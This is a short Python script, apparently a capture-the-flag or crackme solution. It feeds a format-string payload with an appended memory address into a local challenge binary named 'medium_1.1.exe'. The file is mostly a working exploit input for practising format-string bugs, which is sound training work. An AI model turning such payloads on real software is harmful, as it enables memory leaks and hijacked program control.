from subprocess import PIPE, Popen

payload = b"%d%d%d%p%p%saaaa" + b"\x70\xfe\x5f\x00\x00\x00\x00\x00"

p1 = Popen("medium\\medium_1.1.exe", stdin=PIPE)
p1.communicate(payload)
p1.wait()